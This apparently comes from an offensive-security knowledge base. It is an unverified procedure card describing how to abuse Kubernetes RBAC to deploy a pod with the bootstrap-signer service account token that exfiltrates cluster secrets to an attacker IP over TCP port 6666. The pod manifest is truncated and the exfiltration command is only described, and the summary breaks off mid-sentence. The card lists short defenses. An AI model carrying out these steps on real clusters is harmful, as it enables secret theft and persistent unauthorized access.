---
id: d41d97be-258d-4bbb-9466-bf47f16ab6a8
name: Kubernetes RBAC Pod Creation
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:01.257266+00:00'
updated_at: '2023-04-10T20:34:03.113570+00:00'
tags:
- '[[Kubernetes]]'
- '[[Pod Creation]]'
- '[[RBAC Configuration]]'
commands:
- '[[Apply malicious pod]]'
- '[[View Bootstrap Signer Role YAML]]'
---

# Kubernetes RBAC Pod Creation

## Summary

The Kubernetes RBAC Pod Creation procedure demonstrates how an attacker can abuse Kubernetes Role-Based Access Control (RBAC) to deploy a malicious pod. The attacker can create a pod with host networking and mount the service account token to access the Kubernetes API server with the permissions of

## Description

# Description

The Kubernetes RBAC Pod Creation procedure demonstrates how an attacker can abuse Kubernetes Role-Based Access Control (RBAC) to deploy a malicious pod. The attacker can create a pod with host networking and mount the service account token to access the Kubernetes API server with the permissions of the service account. This can allow the attacker to perform actions such as reading secrets and executing commands on other pods in the cluster. This procedure can be used by an attacker to gain persistence and maintain access to the cluster.

 

## Requirements

1. Authenticated access to the Kubernetes cluster.

1. Permission to create and deploy a pod in the cluster.

1. Access to the service account token for the bootstrap-signer service account.

 

## Defense

1. Implement RBAC policies to limit the permissions of service accounts and users in the Kubernetes cluster.

1. Monitor the Kubernetes API server logs for suspicious activity, such as unauthorized pod deployments.

1. Use network segmentation and firewalls to restrict network access to the Kubernetes cluster and limit lateral movement.

 

## Objectives

1. Deploy a malicious pod in the Kubernetes cluster.

1. Gain access to Kubernetes API server and perform malicious actions.

1. Maintain access to the cluster for future attacks.

 

# Instructions

1. Run the following command to check your permissions:

 



**Code**: [[kubectl get role system:controller:bootstrap-signe]]



> This command retrieves the YAML representation of the role object for the bootstrap-signer service account in the kube-system namespace. This allows you to verify that you have the necessary permissions to create and deploy a pod in the cluster.



**Command** ([[View Bootstrap Signer Role YAML]]):

```bash
kubectl get role system:controller:bootstrap-signer -n kube-system -o yaml
```



2. Create a malicious pod by running the following command:

 



**Code**: [[apiVersion: v1
kind: Pod
metadata:
  name: alpine
]]



> This command creates a pod named 'alpine' in the kube-system namespace with host networking and the service account token for the bootstrap-signer service account mounted. The container in the pod executes a command that retrieves secrets from the Kubernetes API server and sends them to the attacker's IP address over TCP port 6666. This allows the attacker to exfiltrate sensitive data from the cluster.

3. Deploy the malicious pod by running the following command:

 



**Code**: [[kubectl apply -f malicious-pod.yaml]]



> This command deploys the malicious pod defined in the 'malicious-pod.yaml' file to the Kubernetes cluster. The pod will start executing the malicious command as soon as it is deployed.



**Command** ([[Apply malicious pod]]):

```bash
kubectl apply -f malicious-pod.yaml
```



## Commands Used

- [[Apply malicious pod]]
- [[View Bootstrap Signer Role YAML]]

## Tags

- [[Kubernetes]]
- [[Pod Creation]]
- [[RBAC Configuration]]


